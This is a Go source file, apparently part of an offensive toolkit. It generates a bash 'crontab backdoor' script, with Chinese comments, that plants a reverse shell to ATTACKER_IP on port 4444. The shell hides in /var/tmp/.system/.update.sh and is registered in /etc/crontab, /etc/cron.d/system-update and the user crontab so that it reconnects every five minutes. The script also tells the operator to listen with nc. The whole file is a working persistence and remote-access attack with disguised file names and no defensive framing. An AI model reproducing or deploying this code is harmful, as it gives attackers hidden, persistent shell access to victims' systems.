package crontab

import (
	"fmt"
	"os"
	"path/filepath"
	"text/template"
	"time"
)

type CrontabBackdoor struct {
	Schedule   string
	Command    string
	BackupPath string
}

func NewCrontabBackdoor() *CrontabBackdoor {
	return &CrontabBackdoor{
		Schedule:   "*/5 * * * *",
		Command:    "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1",
		BackupPath: "/tmp/.backup",
	}
}

func (c *CrontabBackdoor) GeneratePayload(outDir string) error {
	mainScript := `#!/bin/bash
# Crontab Backdoor Generator
# Generated at: {{.Timestamp}}

# 配置信息
ATTACKER_IP="YOUR_IP"
ATTACKER_PORT="4444"
SCHEDULE="*/5 * * * *"

# 创建反弹shell命令
SHELL_CMD="bash -i >& /dev/tcp/$ATTACKER_IP/$ATTACKER_PORT 0>&1"

# 创建隐藏目录和后门文件
HIDE_DIR="/var/tmp/.system"
BACKDOOR_SCRIPT="$HIDE_DIR/.update.sh"
mkdir -p $HIDE_DIR

# 创建后门脚本
cat > $BACKDOOR_SCRIPT << 'EOL'
#!/bin/bash
bash -i >& /dev/tcp/$ATTACKER_IP/$ATTACKER_PORT 0>&1
EOL

chmod +x $BACKDOOR_SCRIPT

# 添加到多个位置实现持久化
echo "$SCHEDULE root $BACKDOOR_SCRIPT" >> /etc/crontab
echo "$SCHEDULE root $BACKDOOR_SCRIPT" >> /etc/cron.d/system-update
(crontab -l 2>/dev/null; echo "$SCHEDULE $BACKDOOR_SCRIPT") | crontab -

# 重启cron服务
service cron reload 2>/dev/null || service crond reload 2>/dev/null

echo "[+] Crontab后门安装完成"
echo "[+] 反弹Shell将每5分钟连接到 $ATTACKER_IP:$ATTACKER_PORT"
echo "[+] 在攻击机器上运行以下命令监听连接:"
echo "    nc -lvnp $ATTACKER_PORT"
`

	scriptPath := filepath.Join(outDir, "crontab_backdoor.sh")
	return c.writeFile(scriptPath, mainScript, struct {
		Timestamp  string
		Schedule   string
		Command    string
		BackupPath string
	}{
		Timestamp:  time.Now().Format("2006-01-02 15:04:05"),
		Schedule:   c.Schedule,
		Command:    c.Command,
		BackupPath: c.BackupPath,
	})
}

func (c *CrontabBackdoor) writeFile(filepath string, content string, data interface{}) error {
	tmpl, err := template.New("crontab").Parse(content)
	if err != nil {
		return fmt.Errorf("failed to parse template: %v", err)
	}

	f, err := os.Create(filepath)
	if err != nil {
		return fmt.Errorf("failed to create file: %v", err)
	}
	defer f.Close()

	if err := tmpl.Execute(f, data); err != nil {
		return fmt.Errorf("failed to execute template: %v", err)
	}

	return os.Chmod(filepath, 0755)
}
